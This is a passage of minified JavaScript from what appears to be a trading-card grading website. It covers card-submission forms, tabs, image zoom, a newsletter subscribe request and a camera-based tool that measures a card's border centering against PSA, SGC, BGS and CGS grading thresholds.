    constructor: app.class.Promise,
    error: function () {
        for (var e = this, t = 0, n = e.errorCallbacks.length; t < n; t++) e.errorCallbacks[t].apply(this);
        e.errored = !0, e.returnPromise && e.returnPromise.error()
    },
    onError: function (e) {
        var t = this;
        t.errored ? e.apply(t.returnPromise) : t.errorCallbacks.push(e)
    },
    resolve: function () {
        var e = this,
            t = [];
        arguments.length && app.each(arguments, (function () {
            t.push(this)
        }));
        for (var n = e.returnPromise ? e.returnPromise : e, o = 0, i = e.callbacks.length; o < i; o++) e.callbacks[o].apply(n, t);
        e.complete = !0
    },
    then: function (e) {
        var t = this;
        return t.returnPromise = t.returnPromise ? t.returnPromise : new app.class.Promise(!1, t.name + " return promise"), t.complete ? e.apply(t.returnPromise) : this.callbacks.push(e), t.returnPromise
    }
}, app.class.SubmissionCard = function (e, t, n) {
    this.$element = e, this.index = t, this.sport = "", this.year = "", this.set = "", this.variant = "", this.playerName = "", this.cardNumber = "", this.estimatedValue = "", this.parentSubmission = n, this.readyToGrade = !1, this.lastInputTimestamp = 0, this.valueDictionary = {
        sport: !1,
        year: !1,
        set: !1,
        variant: !1,
        playerName: !1,
        cardNumber: !1,
        estimatedValue: !1
    }, this.$customSelects = this.$element.find(".custom-select-area"), this.$requiredInputs = this.$element.find(".input-wrap.required"), this.$inputsComplete = this.$element.find(".inputs-completed"), console.log(this.index), this.setupCardHTML(), this.listenYes()
}, app.class.SubmissionCard.prototype = {
    checkCardReady: function () {
        const e = this;
        let t = 0;
        app.isSet(e.valueDictionary.sport) && t++, app.isSet(e.valueDictionary.year) && t++, app.isSet(e.valueDictionary.set) && t++, app.isSet(e.valueDictionary.playerName) && t++, app.isSet(e.valueDictionary.cardNumber) && t++, app.isSet(e.valueDictionary.estimatedValue) && t++, e.$inputsComplete.html(t), 6 == t ? (console.log("card is ready"), e.$element.addClass("card-ready")) : e.$element.removeClass("card-ready")
    },
    listenToInputs: function () {
        const e = this;
        this.$customSelects.each((function () {
            app.fn.setupCustomSelect(this)
        })), this.$requiredInputs.each((function () {
            $inputWrap = $(this);
            new app.class.InputWrapper($inputWrap).on("newValue", (function (e) {
                console.log("new value set: " + e)
            }))
        })), this.$element.find(":input").each((function () {
            $input = $(this), $input.on("input", (function () {
                const t = this.getAttribute("data-card-attribute");
                e.valueDictionary.hasOwnProperty(t) && (e.valueDictionary[t] = this.value, e.checkCardReady())
            }))
        }))
    },
    listenYes: function () {
        this.listenToInputs()
    },
    setupCardHTML: function () {
        var e = this;
        e.$element.attr("data-card-index", e.index), e.$element.find(".card-index").each((function () {
            $(this).html(e.index)
        }))
    }
}, app.class.Submission = function () {
    this.$addCardContainer = $("#add-card-container"), this.$cardTemplate = $("#add-card-template"), this.cardInstanceArray = [], this.addCardToSubmission();
    const e = this;
    setTimeout((function () {
        e.addCardToSubmission()
    }), 1)
}, app.class.Submission.prototype = {
    addCardToPage: function (e) {
        this.$addCardContainer.append(e)
    },
    addCardToSubmission: function () {
        const e = this,
            t = 0 == this.cardInstanceArray.length;
        let n = t ? this.$cardTemplate : this.$cardTemplate.clone();
        t || this.addCardToPage(n), setTimeout((function () {
            const t = e.cardInstanceArray.length + 1,
                o = new app.class.SubmissionCard(n, t, e);
            e.cardInstanceArray.push(o)
        }), 0)
    },
    buildCart: function () { },
    getTotalEstimatedValue: function () { },
    listenYes: function () { },
    saveToCookie: function () { }
}, app.class.TabGroup = function (e) {
    this.tabArray = [], this.tabClass = e, this.listenYes()
}, app.class.TabGroup.prototype = {
    addTab: function (e) {
        this.tabArray.push(e)
    },
    deactivateAll: function (e) {
        for (var t = this, n = 0, o = t.tabArray.length; n < o; n++) t.tabArray[n] != e ? t.tabArray[n].deactivate() : t.tabArray[n].activate()
    },
    listenYes: function () {
        var e = this;
        app.on("activate" + e.tabClass, (function () {
            console.log("activating the tab group " + e.tabClass), e.deactivateAll(e.tabArray[0]), app.notify("activate-" + e.tabClass + "-content-1")
        }))
    }
}, app.class.Tab = function (e, t) {
    this.active, this.parentTabGroup = t, this.$tabClickElement, this.$tabBodyElement = e;
    var n = e.attr("data-tab-class");
    this.tabSubTabClass = n || !1, this.parentTabGroup.addTab(this)
}, app.class.Tab.prototype = {
    activate: function () {
        var e = this;
        e.tabSubTabClass && app.notify("activate" + e.tabSubTabClass), e.active || (e.active = !0, e.$tabBodyElement.on("activated", (function () { })), e.parentTabGroup.deactivateAll(e), e.$tabClickElement.addClass("active"), e.$tabBodyElement.addClass("active"), e.$tabBodyElement.trigger("activated"), e.$tabBodyElement.trigger("activated"))
    },
    addClickElement: function (e) {
        this.$tabClickElement = e, this.listenYes()
    },
    deactivate: function () {
        var e = this;
        e.active = !1, e.$tabClickElement.removeClass("active"), e.$tabBodyElement.removeClass("active"), e.$tabBodyElement.trigger("deactivated")
    },
    listenYes: function () {
        var e = this;
        e.$tabClickElement.on("click", (function (t) {
            e.activate()
        }))
    }
}, app.class.DraggableLine = function (e, t, n) {
    this.$element = e, this.isVertical = t, this.currentlyPressed = !1, this.startPoint = n, this.currentPoint = this.startPoint, this.mouseStart = 0, this.mouseCurrent = 0, this.listenYes()
}, app.class.DraggableLine.prototype = {
    listenYes: function () {
        var e = this;
        e.$element.on(app.vars.swipeStart, (function (t) {
            t.preventDefault();
            var n = app.vars.touchEnabled ? t.originalEvent.touches[0] : t.originalEvent;
            e.mouseStart = e.isVertical ? n.pageX : n.pageY, e.mouseCurrent = e.mouseStart, e.currentlyPressed = !0
        })), app.el.$window.on(app.vars.swipeMove, (function (t) {
            if (e.currentlyPressed) {
                var n = app.vars.touchEnabled ? t.originalEvent.touches[0] : t.originalEvent;
                e.mouseCurrent = e.isVertical ? n.pageX : n.pageY, e.currentPoint = e.startPoint + (e.mouseCurrent - e.mouseStart), e.isVertical ? e.$element.css({
                    left: e.currentPoint + "px"
                }) : e.$element.css({
                    top: e.currentPoint + "px"
                })
            }
        })), app.el.$window.on(app.vars.swipeEnd, (function (t) {
            e.currentlyPressed = !1, e.startPoint = e.currentPoint
        }))
    }
}, app.class.Zoomable = function (e, t) {
    this.element = e[0], this.$element = e, this.currentImageArea = this.element.parentNode, this.isMousedOver = !1, this.zoomedImage = new Image, this.$zoomedImage = null, this.zoomedImageLoaded = !1, this.zoomedImageWidth = 0, this.zoomMultiplier = t, this.zoomImg = this.element.querySelector(".zoom-img"), this.zoomedURL = this.zoomImg.src.replace(".jpg", "-" + t + "x.jpg"), this.elementOffsetLeft = 0, this.elementOffsetTop = 0, this.elementWidth = 0, this.listeningForZoom = !1, this.dataTabID = e.attr("data-tab-id"), this.calculatedZoomRatio = 0, this.hoverDiv = app.create("div", "hover-cover"), this.element.appendChild(this.hoverDiv), this.hoverMessage = app.create("div", "hover-message"), this.zoomIcon = app.create("img"), this.zoomIcon.src = "https://static.edgegrading.com/graphics/icons/zoom.svg";
    let n = app.vars.touchEnabled ? "Touch" : "Hover";
    this.hoverMessage.innerHTML = n + " to zoom", this.hoverMessage.appendChild(this.zoomIcon), this.currentImageArea.appendChild(this.hoverMessage), this.$element.hasClass("active") && this.activate(), this.listenForActivation()
}, app.class.Zoomable.prototype = {
    activate: function () {
        var e = this;
        e.loadZoomedImage().then((function () {
            setTimeout((function () {
                e.calculateDimensions(), e.hoverMessage.classList.add("active"), e.$element.after(e.zoomedImage), e.listeningForZoom || (e.listenForZoom(), e.listeningForZoom = !0)
            }), 0)
        }))
    },
    calculateDimensions: function () {
        var e = this;
        e.elementWidth = e.element.offsetWidth, e.calculatedZoomRatio = e.zoomedImageWidth / e.elementWidth, e.elementOffsetLeft = e.$element.offset().left, e.elementOffsetTop = e.$element.offset().top
    },
    listenForActivation: function () {
        for (var e = this, t = 0; t < e.element.classList.length; t++) {
            var n = e.element.classList[t];
            new RegExp("^tab-(.+)-content").test(n) && app.on("activate-" + n + "-" + e.dataTabID, (function () {
                console.log("should be activating"), e.activate()
            }))
        }
        e.$element.on("activated", (function () {
            e.activate()
        }))
    },
    listenForZoom: function () {
        var e = this;
        e.hoverDiv.addEventListener(app.vars.hoverStart, (function (t) {
            t.preventDefault(), e.isMousedOver = !0, e.$zoomedImage.addClass("zooming"), e.hoverMessage.classList.remove("active")
        })), e.hoverDiv.addEventListener(app.vars.hoverMove, (function (t) {
            if (t.preventDefault(), e.isMousedOver) {
                e.hoverMessage.classList.remove("active"), currentMouseX = app.getPageX(t), currentMouseY = app.getPageY(t);
                var n = currentMouseX - e.elementOffsetLeft,
                    o = currentMouseY - e.elementOffsetTop,
                    i = {
                        x: 0,
                        y: 0
                    },
                    r = e.elementWidth / e.calculatedZoomRatio / 2;
                i.x = n, i.y = o, n < r && (i.x = r), n > e.elementWidth - r && (i.x = e.elementWidth - r), o < r && (i.y = r), o > e.elementWidth - r && (i.y = e.elementWidth - r);
                var a = (i.x - r) / e.elementWidth,
                    s = (i.y - r) / e.elementWidth;
                e.$zoomedImage.css({
                    left: -a * e.zoomedImageWidth + "px",
                    top: -s * e.zoomedImageWidth + "px"
                })
            } else e.isMousedOver = !0, e.$zoomedImage.addClass("zooming")
        })), e.hoverDiv.addEventListener(app.vars.hoverEnd, (function (t) {
            t.preventDefault(), e.$zoomedImage.removeClass("zooming"), e.isMousedOver = !1
        }))
    },
    loadZoomedImage: function () {
        var e = this,
            t = new app.class.Promise(this, "loadZoomedImage");
        return e.zoomedImageLoaded ? t.resolve() : (e.zoomedImage.onload = function () {
            zoomedImageLoaded = !0, e.zoomedImageWidth = e.zoomedImage.naturalWidth, e.$zoomedImage = $(e.zoomedImage), e.$zoomedImage.width(e.zoomedImageWidth + "px"), console.log("zoomedImageWidth: " + e.zoomedImageWidth), t.resolve()
        }, e.zoomedImage.onerror = function () {
            t.error()
        }, e.zoomedImage.classList.add("zoomed"), e.zoomedImage.src = this.zoomedURL), t
    }
}, app.help.centering = {
    toConvolution: app.curry((function (e, t, n, o, i) {
        const r = [];
        let a, s, l, c, u;
        for (let d = 0; d < e; d++)
            for (let p = 0; p < t; p++) {
                a = 0;
                for (let r = d - o; r < d + o + 1; r++)
                    for (let f = p - o; f < p + o + 1; f++) s = (r + e) % e, l = (f + t) % t, c = r - (d - o), u = f - (p - o), a += i[l * e + s] * n[c][u];
                r[p * e + d] = a
            }
        return r
    })),
    toDenormalized: function (e) {
        return e.map((e => 255 * e))
    },
    toGrayscale: function (e, t, n) {
        const o = [];
        for (let t = 0; t < e.length; t += 4) {
            var i = .299 * e[t + 2] + .587 * e[t + 1] + .114 * e[t];
            o.push(i)
        }
        return o
    },
    toNormalized: function (e) {
        const t = [];
        for (let n = 0; n < e.length; n += 4) t.push(e[n] / 255);
        return t
    },
    toPixels: function (e) {
        const t = [];
        return e.forEach((e => {
            t.push(e), t.push(e), t.push(e), t.push(255)
        })), t
    },
    test: () => "test worked"
}, app.fn = {
    listenToHeroCard: function () {
        const e = $(".hero-img img"),
            t = window.innerHeight - 150;
        Math.max(t / 2);
        e.length && (console.log("found"), $(window).on("mousemove", (function (n) {
            const o = n.pageY;
            if (o < t) {
                const n = 20 * (o / t);
                n < 20 && e.css({
                    transform: "rotate3d(1, 0, 0, " + n + "deg)"
                })
            }
        })))
    },
    listenToMobileMenu: function () {
        var e = document.getElementById("menu"),
            t = document.getElementById("mobile-menu-button"),
            n = !1;
        let o = "ontouchstart" in window ? "touchstart" : "click";
        t && t.addEventListener(o, (function (t) {
            t.preventDefault(), t.stopPropagation(), n ? (e.classList.remove("active"), n = !1) : (e.classList.add("active"), n = !0)
        }))
    },
    listenToSubscribe: function () {
        $("#centering-overlay-close").on("click", (function (e) {
            e.preventDefault(), app.el.$centeringOverlay.removeClass("active")
        })), $("#centering-subscribe").on("submit", (function (e) {
            e.preventDefault();
            const t = $(this).find('input[name="email"]').val();
            console.log("email: " + t);
            (async function () {
                return await fetch("/ajax/subscribe/", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        email: t
                    })
                }).then((e => e.json()))
            })().then((e => {
                "success" == e.status && (gtag("event", "call_to_action", {
                    event_type: "subscribe"
                }), app.storePut("subscribed", !0)), app.el.$centeringOverlay.removeClass("active")
            }))
        }))
    },
    loadVars: function () {
        app.vars.footerOffsetTop = Math.round($(".footer-top").length ? $(".footer-top").offset().top : 700), console.log("app.vars.footerOffsetTop: " + app.vars.footerOffsetTop)
    },
    setupCentering: function () {
        if ($("#centering-page").length > 0) new app.class.CenteringTool
    },
    setupCustomSelect: function (e) {
        var t = $(e),
            n = t.children("label.select-label"),
            o = n.text();
        t.find("select").on("focus", (function () {
            t.addClass("focus")
        })).on("blur", (function () {
            t.removeClass("focus")
        })).on("change", (function () {
            if (app.isSet(this.selectedIndex) && app.isSet(this.options[this.selectedIndex])) {
                var e = this.options[this.selectedIndex].text;
                n.text(e), t.addClass("has-value")
            } else n.text(o)
        }))
    },
    setupForms: function () {
        $(".input-wrap.required").each((function () {
            $inputWrap = $(this)
        }))
    },
    setupFormSelect: function () {
        var e = this;
        $(".custom-select-area").each((function () {
            e.setupCustomSelect(this)
        }))
    },
    setupLazyLoad: function () {
        $(".lazy").each((function () {
            var e = $(this);
            new app.class.LazyLoad(e)
        }))
    },
    setupSubmission: function () {
        console.log("submit");
        new app.class.Submission
    },
    stickyInit: function () {
        function e(e, t) {
            this.settings = $.extend({
                topPad: 5
            }, t), this.element = e, this.$element = $(e), this.marginFromFooter = 0, this.originalTop = this.element.style.top, this.originalPosition = this.element.style.position, this.height = 1 * this.$element.height(), this.x = 1 * this.$element.offset().left, this.y = 1 * this.$element.offset().top, this.stickyEnabled = !0, this.stuck = !1, this.stickyEndElement = $("#sticky-end"), this.stickyEndElementY = !!$("#sticky-end").length && Math.ceil(1 * $("#sticky-end").offset().top), this.listenYes(), this.checkStickyEnabled()
        }
        if (e.prototype = {
            checkStickyEnabled: function () {
                var e = this;
                console.log("checkStickyEnabled: " + app.vars.footerOffsetTop + " me.stickyEndElementY: " + e.stickyEndElementY + " me.y: " + e.y + " me.height: " + e.height), !e.stuck && app.vars.footerOffsetTop - e.y < app.vars.windowHeight + e.marginFromFooter ? (console.log("no 1"), e.stickyEnabled = !1) : e.y + e.height + e.marginFromFooter > e.stickyEndElementY ? (e.stickyEnabled = !1, console.log("no 2")) : (e.stickyEnabled = !0, console.log("yes"))
            },
            listenYes: function () {
                var e = this;
                app.on("windowResized", (function () {
                    e.resize()
                }))
            },
            resize: function () {
                this.checkStickyEnabled()
            },
            scrolled: function (e) {
                var t = this,
                    n = t.stickyEndElementY ? t.stickyEndElementY : app.vars.footerOffsetTop;
                app.vars.windowWidth >= 1200 && (t.stickyEnabled && !t.stuck && e > t.y - t.settings.topPad ? (t.stuck = !0, t.resize(), t.element.style.position = "fixed", t.element.style.top = t.settings.topPad + "px", t.element.style.left = t.x) : t.stuck && e <= t.y - t.settings.topPad && (t.stuck = !1, t.element.style.top = t.originalTop, t.element.style.position = t.originalPosition), t.stuck && e > n - (t.height + t.marginFromFooter) ? t.element.style.marginTop = -1 * (e - (n - (t.height + t.marginFromFooter))) + "px" : t.element.style.marginTop = 0)
            }
        }, !$("#sticky-cancel").length) {
            var t = $(".sticky");
            if (t.length) {
                var n = new e(t[0]);
                app.vars.stickyArray.push(n), window.onscroll = function () {
                    var e = window.pageYOffset;
                    n.scrolled(e)
                }
            }
        }
    },
    tabsInit: function () {
        var e = $(".tabbed");
        e.length && e.each((function () {
            var e = $(this),
                t = e.attr("data-tab-class"),
                n = new app.class.TabGroup(t);
            app.vars.tabGroupInstances[t] = n, e.find("." + t + "-content").each((function () {
                var e = $(this),
                    o = new app.class.Tab(e, n),
                    i = e.attr("data-tab-id");
                o.addClickElement($("." + t + "-" + i))
            }))
        }))
    },
    zoomInit: function () {
        var e = $(".zoomable");
        e.length && e.each((function () {
            var e = $(this),
                t = e.attr("data-zoom-multiplier");
            if (t) new app.class.Zoomable(e, t)
        }))
    }
}, $(window).on("load", (function () {
    app.listenToWindow(), app.fn.listenToMobileMenu(), app.fn.listenToSubscribe(), app.fn.loadVars(), app.fn.setupCentering(), app.fn.setupForms(), app.fn.setupFormSelect(), app.fn.setupLazyLoad(), app.fn.stickyInit(), app.fn.tabsInit(), app.fn.zoomInit(), $("#submission").length > 0 && app.fn.setupSubmission()
})), app.addSettings("center", {
    gradingStandards: {
        psa: {
            g10: {
                label: "10",
                front: 60,
                back: 75
            },
            g9: {
                label: "9",
                front: 65,
                back: 90
            },
            g8: {
                label: "8",
                front: 70,
                back: 90
            },
            g7: {
                label: "7",
                front: 75,
                back: 90
            },
            gLessThan7: {
                label: "<7",
                front: 100,
                back: 100
            }
        },
        sgc: {
            plus: {
                label: "10 PRI",
                front: 50,
                back: 50
            },
            g10: {
                label: "10",
                front: 55,
                back: 55
            },
            g9: {
                label: "9",
                front: 60,
                back: 60
            },
            g8: {
                label: "8",
                front: 65,
                back: 65
            },
            g7: {
                label: "7",
                front: 70,
                back: 70
            },
            gLessThan7: {
                label: "<7",
                front: 100,
                back: 100
            }
        },
        bgs: {
            plus: {
                label: "10",
                front: 50,
                back: 50
            },
            g10: {
                label: "9.5",
                front: 55,
                back: 60
            },
            g9: {
                label: "9",
                front: 55,
                back: 70
            },
            g8: {
                label: "8",
                front: 60,
                back: 80
            },
            g7: {
                label: "7",
                front: 65,
                back: 90
            },
            gLessThan7: {
                label: "<7",
                front: 100,
                back: 100
            }
        },
        cgs: {
            g10: {
                label: "10",
                front: 50,
                back: 50
            },
            g9: {
                label: "9",
                front: 55,
                back: 55
            },
            g8: {
                label: "8",
                front: 60,
                back: 60
            },
            g7: {
                label: "7",
                front: 65,
                back: 65
            },
            gLessThan7: {
                label: "<7",
                front: 100,
                back: 100
            }
        }
    },
    videoWidthMultiplier: 1.4,
    hdConstraints: {
        video: {
            width: {
                ideal: 2e3
            },
            facingMode: "environment"
        }
    }
}), app.addState("center", {
    borderDimensions: {
        left: {
            inside: 0,
            outside: 0
        },
        right: {
            inside: 0,
            outside: 0
        },
        top: {
            inside: 0,
            outside: 0
        },
        bottom: {
            inside: 0,
            outside: 0
        }
    },
    draggableLines: {},
    imageChosen: !1,
    imageDataURL: !1
}), app.class.CenteringTool = function () {
    const e = document.createElement("canvas"),
        t = e.getContext("2d");
    this.el = {
        canvas: document.getElementById("still-canvas"),
        canvasContext: document.getElementById("still-canvas").getContext("2d"),
        capture: document.getElementById("capture"),
        clickToCapture: document.getElementById("click-to-capture"),
        clickToUpload: document.getElementById("upload-select"),
        colorCanvas: e,
        colorCanvasContext: t,
        dropboxArea: document.getElementById("upload-select"),
        finalImageUrl: document.getElementById("final-image-url"),
        finalImageUrlCopy: document.getElementById("final-image-url-copy"),
        imageInput: document.getElementById("image-input"),
        measurePercentageLeft: document.getElementById("measure-percentage-left"),
        measurePercentageRight: document.getElementById("measure-percentage-right"),
        measurePercentageTop: document.getElementById("measure-percentage-top"),
        measurePercentageBottom: document.getElementById("measure-percentage-bottom"),
        measureSubmit: document.getElementById("measure-submit"),
        measureValueLeft: document.getElementById("measure-value-left"),
        measureValueRight: document.getElementById("measure-value-right"),
        measureValueTop: document.getElementById("measure-value-top"),
        measureValueBottom: document.getElementById("measure-value-bottom"),
        redirectClick: document.getElementById("link-to-final-image"),
        sourceImg: document.getElementById("source-img"),
        uploadConfirm: document.getElementById("upload-confirm-button"),
        uploadItems: document.getElementById("upload-items"),
        uploadScanContainer: document.getElementById("upload-scan-container")
    }, this.settings = {
        maximumDimensions: {
            height: 1200,
            width: 1200
        }
    }, this.state = {
        centeringStats: {
            borderLeftInMM: 0,
            borderRightInMM: 0,
            borderTopInMM: 0,
            borderBottomInMM: 0,
            borderLeftPercentage: 0,
            borderRightPercentage: 0,
            borderTopPercentage: 0,
            borderBottomPercentage: 0
        },
        imageChosen: !1,
        imageDataURL: !1,
        resizedDimensions: {
            height: 0,
            width: 0
        }
    }, app.isMobile() && app.hasCapture() && $(".page-content").addClass("has-capture"), this.listenYes()
}, app.class.CenteringTool.prototype = {
    beginCenteringProcess: function (e) {
        const t = this;
        t.el.sourceImg.onload = function () {
            t.showPreview(e), t.findEdges(), $(".centering-header").addClass("loading")
        }, t.el.sourceImg.src = e
    },
    calculateBorders: function () {
        const e = this;
        var t = Math.abs(app.state.center.draggableLines.leftInsideLine.currentPoint - app.state.center.draggableLines.leftOutsideLine.currentPoint),
            n = Math.abs(app.state.center.draggableLines.rightOutsideLine.currentPoint - app.state.center.draggableLines.rightInsideLine.currentPoint),
            o = t + n;
        leftPercentage = Math.round(t / o * 100), rightPercentage = Math.round(n / o * 100);
        var i = Math.abs(app.state.center.draggableLines.topInsideLine.currentPoint - app.state.center.draggableLines.topOutsideLine.currentPoint),
            r = Math.abs(app.state.center.draggableLines.bottomOutsideLine.currentPoint - app.state.center.draggableLines.bottomInsideLine.currentPoint),
            a = i + r;
        topPercentage = Math.round(i / a * 100), bottomPercentage = Math.round(r / a * 100);
        const s = app.state.center.draggableLines.rightOutsideLine.currentPoint - app.state.center.draggableLines.leftOutsideLine.currentPoint,
            l = app.state.center.draggableLines.bottomOutsideLine.currentPoint - app.state.center.draggableLines.topOutsideLine.currentPoint,
            c = 63.5 * (t / s),
            u = 63.5 * (n / s),
            d = 88.9 * (i / l),
            p = 88.9 * (r / l);
        e.state.centeringStats.borderLeftInMM = app.round(c), e.state.centeringStats.borderRightInMM = app.round(u), e.state.centeringStats.borderTopInMM = app.round(d), e.state.centeringStats.borderBottomInMM = app.round(p), e.state.centeringStats.borderLeftPercentage = leftPercentage, e.state.centeringStats.borderRightPercentage = rightPercentage, e.state.centeringStats.borderTopPercentage = topPercentage, e.state.centeringStats.borderBottomPercentage = bottomPercentage, e.el.measureValueLeft.innerHTML = app.round(c) + "mm", e.el.measureValueRight.innerHTML = app.round(u) + "mm", e.el.measureValueTop.innerHTML = app.round(d) + "mm", e.el.measureValueBottom.innerHTML = app.round(p) + "mm", e.el.measurePercentageLeft.innerHTML = leftPercentage + "%", e.el.measurePercentageRight.innerHTML = rightPercentage + "%", e.el.measurePercentageTop.innerHTML = topPercentage + "%", e.el.measurePercentageBottom.innerHTML = bottomPercentage + "%"
    },
    captureFromCamera: function () {
        const e = this,
            t = document.createElement("video");
        window.innerWidth;
        t.setAttribute("autoplay", ""), t.setAttribute("muted", ""), t.setAttribute("playsinline", ""), t.style.display = "none", document.getElementById("video-container").appendChild(t), $("#capture-button").on("click", (function () {
            e.el.canvas.getContext("2d").drawImage(t, 0, 0, e.el.canvas.width, e.el.canvas.height);
            let n = e.el.canvas.toDataURL("image/jpeg", 1);
            const o = document.createElement("img");
            o.onload = function () {
                document.getElementById("upload-select").classList.add("image-uploaded"), e.state.imageChosen = !0, document.getElementById("upload-preview").innerHTML = "", document.getElementById("upload-preview").appendChild(o), e.state.imageDataURL = n, e.el.capture.classList.remove("active")
            }, o.src = n
        })), navigator.mediaDevices.getUserMedia(app.settings.center.hdConstraints).then((function (n) {
            var o = n;
            t.srcObject = n;
            var i = !1;
            t.addEventListener("loadedmetadata", (function (n) {
                if (!i) {
                    i = !0;
                    var r = window.innerWidth < window.innerHeight;
                    t.videoHeight > t.videoWidth ? smallestDimension = t.videoWidth : smallestDimension = t.videoHeight, o.getTracks().forEach((function (e) {
                        e.stop()
                    }));
                    var a = {
                        audio: !1,
                        video: {
                            width: smallestDimension,
                            height: smallestDimension,
                            facingMode: "environment"
                        }
                    };
                    navigator.mediaDevices.getUserMedia(a).then((function (n) {
                        t.srcObject = n;
                        var o = window.innerHeight - 130;
                        t.style.width = o + "px", t.style.height = o + "px", t.style.marginLeft = -o / 2 + "px", t.style.display = "block";
                        var i = document.getElementById("screen-area"),
                            a = document.getElementById("still-canvas");
                        i.style.width = document.body.clientWidth + "px", i.style.height = window.innerHeight + "px", e.el.capture.style.height = window.innerHeight + 80 + "px", a.width = smallestDimension, a.height = smallestDimension, a.style.width = o + "px", a.style.height = o + "px", a.style.marginLeft = -o / 2 + "px";
                        var s = document.getElementById("video-container");
                        s.style.width = o + "px", s.style.height = o + "px", s.style.marginLeft = -o / 2 + "px";
                        let l = .8 * o,
                            c = .7143 * l,
                            u = (o - c) / 2,
                            d = o - u,
                            p = (o - l) / 2,
                            f = o - p;
                        r && (c = .8 * window.innerWidth, l = 1.4 * c, u = (window.innerWidth - c) / 2, d = window.innerWidth - u, p = (o - l) / 2, f = o - p, $("#video-card-opacity").css({
                            marginLeft: -window.innerWidth / 2,
                            left: "50%",
                            width: window.innerWidth
                        })), $("#video-card-overlay").css({
                            width: c + "px",
                            height: l + "px",
                            top: (o - l) / 2 + "px",
                            marginLeft: -c / 2 + "px"
                        }), $("#video-card-opacity").css({
                            clipPath: "polygon(0% 0%, 0% 100%, " + u + "px 100%, " + u + "px " + p + "px, " + d + "px " + p + "px, " + d + "px " + f + "px, " + u + "px " + f + "px, " + u + "px 100%, 100% 100%, 100% 0%)"
                        }), e.el.capture.classList.add("active")
                    }))
                }
            }), !1)
        }))
    },
    createImage: function () {
        const e = this,
            t = 200,
            n = e.state.resizedDimensions.width < 1200 ? 1200 : e.state.resizedDimensions.width,
            o = (n - e.state.resizedDimensions.width) / 2;
        e.state.resizedDimensions.width;
        var i = o + e.natural(app.state.center.draggableLines.leftOutsideLine.currentPoint),
            r = o + e.natural(app.state.center.draggableLines.leftInsideLine.currentPoint),
            a = o + e.natural(app.state.center.draggableLines.rightOutsideLine.currentPoint),
            s = o + e.natural(app.state.center.draggableLines.rightInsideLine.currentPoint),
            l = t + e.natural(app.state.center.draggableLines.topOutsideLine.currentPoint),
            c = t + e.natural(app.state.center.draggableLines.topInsideLine.currentPoint),
            u = t + e.natural(app.state.center.draggableLines.bottomOutsideLine.currentPoint),
            d = t + e.natural(app.state.center.draggableLines.bottomInsideLine.currentPoint);
        const p = t,
            f = t + e.state.resizedDimensions.height,
            h = o,
            m = n - o;
        e.el.colorCanvas.height = e.state.resizedDimensions.height + 500, e.el.colorCanvas.width = n, e.el.colorCanvasContext.beginPath(), e.el.colorCanvasContext.fillStyle = "white", e.el.colorCanvasContext.fillRect(0, 0, n, e.el.colorCanvas.height), e.el.colorCanvasContext.drawImage(e.el.sourceImg, o, t, e.state.resizedDimensions.width, e.state.resizedDimensions.height), e.el.colorCanvasContext.lineWidth = 1, e.el.colorCanvasContext.strokeStyle = "#FF8400", e.el.colorCanvasContext.strokeStyle = "#23c6d8", e.el.colorCanvasContext.strokeStyle = "#01fe01", e.el.colorCanvasContext.strokeStyle = "#ec008c", e.el.colorCanvasContext.beginPath(), e.el.colorCanvasContext.moveTo(i, p), e.el.colorCanvasContext.lineTo(i, f), e.el.colorCanvasContext.stroke(), e.el.colorCanvasContext.beginPath(), e.el.colorCanvasContext.moveTo(r, p), e.el.colorCanvasContext.lineTo(r, f), e.el.colorCanvasContext.stroke(), e.el.colorCanvasContext.beginPath(), e.el.colorCanvasContext.moveTo(a, p), e.el.colorCanvasContext.lineTo(a, f), e.el.colorCanvasContext.stroke(), e.el.colorCanvasContext.beginPath(), e.el.colorCanvasContext.moveTo(s, p), e.el.colorCanvasContext.lineTo(s, f), e.el.colorCanvasContext.stroke(), e.el.colorCanvasContext.beginPath(), e.el.colorCanvasContext.moveTo(h, l), e.el.colorCanvasContext.lineTo(m, l), e.el.colorCanvasContext.stroke(), e.el.colorCanvasContext.beginPath(), e.el.colorCanvasContext.moveTo(h, c), e.el.colorCanvasContext.lineTo(m, c), e.el.colorCanvasContext.stroke(), e.el.colorCanvasContext.beginPath(), e.el.colorCanvasContext.moveTo(h, u), e.el.colorCanvasContext.lineTo(m, u), e.el.colorCanvasContext.stroke(), e.el.colorCanvasContext.beginPath(), e.el.colorCanvasContext.moveTo(h, d), e.el.colorCanvasContext.lineTo(m, d), e.el.colorCanvasContext.stroke();
        const g = 1 * Math.round(n / 3),
            v = 2 * g - 20,
            y = 1 * Math.round(g / 2);
        let b = "34px";

        function x(e, t, n, o, i, r) {
            const a = e ? "front" : "back";
            for (key in n) {
                const e = n[key];
                if (leftPercentage <= e[a] && rightPercentage <= e[a] && topPercentage <= e[a] && bottomPercentage <= e[a]) return void t.fillText(o + ": " + e.label, i, r)
            }
        }
        e.el.colorCanvasContext.fillStyle = "#000", e.el.colorCanvasContext.font = "500 " + b + " 'Barlow'", e.el.colorCanvasContext.textAlign = "center", e.el.colorCanvasContext.fillText("左/右:", g + y, 60), e.el.colorCanvasContext.font = "italic 300 " + b + " 'Barlow'", e.el.colorCanvasContext.fillText(e.state.centeringStats.borderLeftInMM + "mm / " + e.state.centeringStats.borderRightInMM + "mm", g + y, 110), e.el.colorCanvasContext.fillStyle = "#ec008c", e.el.colorCanvasContext.font = "800 " + b + " 'Barlow'", e.el.colorCanvasContext.fillText(e.state.centeringStats.borderLeftPercentage + "% / " + e.state.centeringStats.borderRightPercentage + "%", g + y, 160), e.el.colorCanvasContext.fillStyle = "#000", e.el.colorCanvasContext.font = "500 " + b + " 'Barlow'", e.el.colorCanvasContext.textAlign = "center", e.el.colorCanvasContext.fillText("上/下:", v + y, 60), e.el.colorCanvasContext.font = "italic 300 " + b + " 'Barlow'", e.el.colorCanvasContext.fillText(e.state.centeringStats.borderTopInMM + "mm / " + e.state.centeringStats.borderBottomInMM + "mm", v + y, 110), e.el.colorCanvasContext.fillStyle = "#ec008c", e.el.colorCanvasContext.font = "800 " + b + " 'Barlow'", e.el.colorCanvasContext.fillText(e.state.centeringStats.borderTopPercentage + "% / " + e.state.centeringStats.borderBottomPercentage + "%", v + y, 160);
        const w = 200 + e.state.resizedDimensions.height + 60,
            C = 50;
